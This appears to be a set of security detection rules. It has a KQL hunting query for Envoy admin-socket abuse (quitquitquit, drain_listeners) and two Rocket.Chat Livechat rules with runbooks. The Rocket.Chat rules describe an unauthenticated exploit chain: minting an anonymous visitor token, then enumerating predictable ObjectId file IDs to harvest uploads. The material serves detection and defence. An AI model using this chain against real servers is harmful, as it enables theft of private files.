| where ActingProcessCommandLine has "admin.sock"
| where ActingProcessCommandLine has_any ("quitquitquit", "drain_listeners", "healthcheck/fail", "reset_counters")
| where ActingProcessName !has "cilium"
| where ActingProcessCommandLine !has "cilium-agent" and ActingProcessCommandLine !has "cilium-envoy"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Rocket.Chat Livechat file-upload ID enumeration sweep (ObjectId harvest) AIActions on Objectives High
Hunts an unauthenticated source pulling many distinct /file-upload/{fileId} objects while carrying the Livechat authorization params (rc_room_type=l + rc_token) — the continuous ObjectId-prediction harvest described in the Aikido disclosure. High volume of distinct fileIds from one IP via the Livechat auth path is the signature of the mass file-capture exploit. Rationale: Anchors on the exact exploit request shape from the article's Python PoC — GET /file-upload/{fileId} with rc_room_type=l and rc_token query params — combined with a distinct-fileId volume threshold that captures the 'retrieve all generated valid IDs continuously' harvest. Legit Livechat file access does not fan out across dozens of unrelated fileIds. Cross-checked against: • https://www.aikido.dev/blog/predicting-mongodb-objectid-rocket-chat • https://hackerone.com/reports/3687142 • https://docs.rocket.chat/docs/rocketchat-security-fixes-updates-and-advisories • https://github.com/RocketChat/Rocket.Chat/releases/tag/8.5.0
ATT&CKT1213 T1190

  • Load balancer / uptime monitor health-checking a file-upload URL repeatedly (usually one fixed path, not distinct fileIds)
  • Internal backup or migration tooling iterating over uploads with a service token
  • Authorized DAST/vulnerability scanner (Aikido, Burp) replaying the PoC against a staging instance
  • CDN origin prefetch pulling attachments

Response runbook
1) Triage: pull the source IP's full request timeline; confirm the requests carry rc_room_type=l + rc_token and hit many DISTINCT fileIds, and check whether the Rocket.Chat build predates 8.5.1/8.4.4/8.3.6/8.2.6/8.1.6/8.0.7/7.13.9/7.10.13 (vulnerable). 2) Contain: block the source IP at the WAF/reverse proxy, and if patch is not yet deployed, disable Livechat (Admin > Omnichannel) or upgrade immediately. 3) Hunt: enumerate which fileIds returned HTTP 200 to that IP to scope leaked files, and search for the same IP creating anonymous visitors (POST /api/v1/livechat/visitor) to identify the session token used.

Rocket.Chat anonymous Livechat visitor bootstrap chained to file-upload access AIExploitation Medium
Detects the full unauthenticated exploit chain: a single source registering an anonymous Livechat visitor (POST /api/v1/livechat/visitor), requesting a room (GET /api/v1/livechat/room), then reading files via /file-upload/ within a short window. This is the session-bootstrap primitive the exploit uses to mint a valid rc_token/rc_rid before harvesting arbitrary files. Rationale: Chains the three exact endpoints from the PoC (POST /api/v1/livechat/visitor, GET /api/v1/livechat/room, GET /file-upload/) within a 10-minute window keyed on source IP — the minimum footprint of the unauthenticated access-control bypass. Individually noisy, together it is the exploit workflow. Cross-checked against: • https://www.aikido.dev/blog/predicting-mongodb-objectid-rocket-chat • https://hackerone.com/reports/3687142 • https://github.com/RocketChat/Rocket.Chat/releases/tag/8.5.0

  • Synthetic monitoring that scripts a Livechat conversation end-to-end
  • Support-widget embedded on a high-traffic page generating many short-lived visitor sessions
  • Rocket.Chat mobile/desktop client polling room + upload endpoints during normal use
  • Pen-test / bug-bounty researcher reproducing the chain on an authorized instance
Response runbook
1) Triage: confirm the visitor registration and file reads share one SrcIpAddr and that the /file-upload/ requests carry rc_room_type=l; verify the instance version against the patched list. 2) Contain: block the IP at the proxy/WAF and, if unpatched, disable Livechat or upgrade to the fixed build. 3) Hunt: pivot on the source IP to the enumeration-sweep detection to measure how many files were pulled, and review Content-Disposition/response sizes to identify sensitive filenames leaked.
